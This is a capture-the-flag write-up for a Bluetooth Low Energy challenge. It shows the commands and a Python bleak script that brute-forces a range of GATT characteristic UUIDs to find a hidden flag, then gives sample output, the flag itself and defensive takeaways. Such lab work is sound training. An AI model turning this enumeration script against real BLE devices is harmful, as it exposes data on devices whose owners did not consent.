# Writeup - Challenge 10: Ghost in the GATT

**Difficulty:** ⭐⭐⭐⭐⭐ Advanced
**Category:** Bluetooth Low Energy
**Flag:** `WOCSA{uuid_brute_force_unlocks_secrets}`

---

## Step 1: Scan and Identify the Device

```bash
bluetoothctl
[bluetooth]# scan on
```

Expected output:
```
[NEW] Device AA:BB:CC:DD:EE:FF THCON26_BLE_10
```

---

## Step 2: Inspect the Advertising Packet

Use nRF Connect or `hcitool lescan` + `hcidump` to read the full advertising data. In the scan response you will find a **Manufacturer Specific Data** field:

```
FF FF C0
```

* `0xFFFF` — test company ID (unregistered)
* `0xC0` — hint: the variable byte of the characteristic UUID starts with `0xC0`

---

## Step 3: Connect and Enumerate

```bash
gatttool -b AA:BB:CC:DD:EE:FF -I
[AA:BB:CC:DD:EE:FF][LE]> connect
[AA:BB:CC:DD:EE:FF][LE]> characteristics
```

Expected output (abbreviated):
```
handle: 0x0002  uuid: b100d000-c001-1000-8000-00805f9b34fb  READ
handle: 0x0004  uuid: b100d000-c003-1000-8000-00805f9b34fb  READ
handle: 0x0006  uuid: b100d000-c007-1000-8000-00805f9b34fb  READ
...
handle: 0x001e  uuid: b100d000-c0ba-1000-8000-00805f9b34fb  READ
handle: 0x0020  uuid: b100d000-????-1000-8000-00805f9b34fb  READ
```

The UUIDs all follow the pattern `b100d000-C0XX-...`. Manually reading each one returns decoy strings. There are 11 characteristics; 10 return decoys and one returns the flag.

---

## Step 4: Brute-Force the Variable UUID Component

The advertising hint tells us XX is in the range `0xC000–0xC0FF` (256 candidates). Write a script that iterates every value, reads the characteristic, and checks for the flag:

```python
import asyncio
from bleak import BleakClient

async def main():
    async with BleakClient("AA:BB:CC:DD:EE:FF") as client:
        services = client.services  # auto-discovered on connect (Bleak ≥ 0.20)

        for xx in range(0x100):
            uuid = f"b100d000-c0{xx:02x}-1000-8000-00805f9b34fb"
            try:
                val = await client.read_gatt_char(uuid)
                decoded = val.decode("utf-8", errors="ignore")
                print(f"[+] {uuid} → {decoded[:60]}")
                if "WOCSA{" in decoded:
                    print(f"\n[!!!] FLAG FOUND: {decoded}")
                    return
            except Exception:
                pass

asyncio.run(main())
```

---

## Step 5: Result

The script iterates silently past UUIDs not registered on the device and prints a hit for each that responds:

```
[+] b100d000-c001-... → not_here
[+] b100d000-c003-... → try_again
[+] b100d000-c007-... → keep_looking
[+] b100d000-c00f-... → almost...
[+] b100d000-c01e-... → nope
[+] b100d000-c033-... → wrong_uuid
[+] b100d000-c064-... → decoy_data
[+] b100d000-c099-... → access_denied
[+] b100d000-c0ab-... → invalid_handle
[+] b100d000-c0ba-... → null_value
[+] b100d000-c0de-... → WOCSA{uuid_brute_force_unlocks_secrets}

[!!!] FLAG FOUND: WOCSA{uuid_brute_force_unlocks_secrets}
```

The flag lives at `C0DE` — a classic hex word.

---

## Flag

```
WOCSA{uuid_brute_force_unlocks_secrets}
```

---

## Key Takeaways

* **GATT discovery is a convenience layer**, not a security boundary. If a characteristic is registered on the server, it can be accessed directly by UUID — with or without prior service/characteristic enumeration.
* **UUID-based access control** does exist in some real-world devices, but it is security-through-obscurity: a 16-bit variable space (65536 values) is trivially enumerable, and even a 32-bit space is brute-forceable offline.
* The ATT protocol's "Read By UUID" operation lets a client address any attribute by UUID across a handle range — no discovery required.
* **Defense:** UUID obscurity alone is not a security control. Pair it with encryption, authentication (bonding), and a short advertising window to meaningfully raise the bar.
* The `bleak` library's `read_gatt_char(uuid)` method performs a UUID→handle lookup from the discovered table, making it straightforward to script UUID iteration.
